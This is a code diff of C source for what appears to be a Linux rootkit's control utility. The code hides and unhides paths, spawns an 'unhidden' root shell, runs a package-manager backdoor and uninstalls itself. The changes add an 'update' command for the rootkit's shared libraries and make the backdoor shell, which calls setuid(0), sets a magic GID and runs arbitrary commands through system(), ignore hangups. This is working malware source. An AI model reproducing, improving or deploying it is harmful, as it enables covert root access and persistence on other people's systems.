@@ -1,11 +1,12 @@
 void option_err(char *a0){
     printf("\e[1;31mValid commands:\e[0m\n");
-    printf("\t%s hide/unhide <path>\n", a0);
-    printf("\t%s uninstall\n", a0);
-    printf("\t%s unhideself\n", a0);
-    printf("\t%s makelinks\n", a0);
+    printf("  %s update build/*.so.*\n", a0);
+    printf("  %s hide/unhide <path>\n", a0);
+    printf("  %s uninstall\n", a0);
+    printf("  %s unhideself\n", a0);
+    printf("  %s makelinks\n", a0);
 #ifdef READ_GID_FROM_FILE
-    printf("\t%s changegid\n", a0);
+    printf("  %s changegid\n", a0);
 #endif
 #ifdef BACKDOOR_PKGMAN
     size_t tmpsize, buflen;
@@ -24,12 +25,14 @@ void option_err(char *a0){
         strncat(validmans, tmp, tmpsize);
     }
     validmans[strlen(validmans)-1]='\0';
-    printf("\t%s %s <args>\n", a0, validmans);
+    printf("  %s %s <args>\n", a0, validmans);
 #endif
     exit(0);
 }
 void do_self(void){
-    printf("Unhiding self...\n");
+    printf("You are about to spawn an unhidden shell.\n");
+    printf("\e[1mPress enter if you're absolutely sure. ^C to cancel.\e[0m");
+    getchar();
     
     pid_t pid=fork();
     if(pid < 0){
@@ -38,6 +41,7 @@ void do_self(void){
     }else if(pid > 0){
         for(int i=0; i<3; i++)
             close(i);
+        signal(SIGHUP, SIG_IGN);
         wait(NULL);
         return;
     }
@@ -48,7 +52,7 @@ void do_self(void){
     }
 
     hook(CSETGID, CCHDIR);
-    call(CCHDIR, "/");
+    call(CCHDIR, "/tmp");
     unsetenv("HOME");
     call(CSETGID, 0);
 
@@ -79,24 +83,30 @@ void symlinkstuff(void){
     int ok=0, fail=0, exist=0, acc, syml;
     for(int i = 0; i < LINKSRCS_SIZE; i++){
         src = linksrcs[i];
-        dest = linkdests[i];
+        dest = linkdest(i);
         linkname = basename(dest);
 
         acc = (long)call(CACCESS, src, F_OK);
         if(acc < 0 && errno != ENOENT){
             fail++;
             printf("Something went wrong trying to access %s (\e[31m%s\e[0m)\n", src, linkname);
+            free(dest);
             continue;
-        }else if(acc < 0) continue;
+        }else if(acc < 0){
+            free(dest);
+            continue;
+        }
 
         syml = (long)call(CSYMLINK, src, dest);
         if(syml < 0 && errno == EEXIST){
             exist++;
+            free(dest);
             continue;
         }else if(syml < 0){
             fail++;
             printf("Failed linking: %s -> ~/\e[31m%s\e[0m\n", src, linkname);
         }else ok++;
+        free(dest);
     }
 
     if(ok > 0) printf("\e[1mSuccessful links: \e[1;31m%d\e[0m\n", ok);
@@ -144,14 +154,19 @@ void dobdvutil(char *const argv[]){
 
             pid_t pid = fork();
             if(pid > 0){
+                for(int i=0; i<3; i++)
+                    close(i);
+                signal(SIGHUP, SIG_IGN);
                 wait(NULL);
             }
             if(pid == 0){
-                hook(CSETGID);
+                signal(SIGHUP, SIG_IGN);
+                hook(CSETGID, CCHDIR);
                 setuid(0);
                 call(CSETGID, 0);
+                putenv("HOME=/tmp");
                 putenv(BD_VAR"=1");
-                chdir("/");
+                call(CCHDIR, "/tmp");
                 system("id");
                 system(argbuf);
                 wait(NULL);
@@ -178,6 +193,11 @@ void dobdvutil(char *const argv[]){
         exit(0);
     }
 #endif
+
+    if(!strcmp("update", option)){
+        bdvupdate(argv);
+        exit(0);
+    }
 
     if(!strcmp("uninstall", option)){
         uninstallbdv();
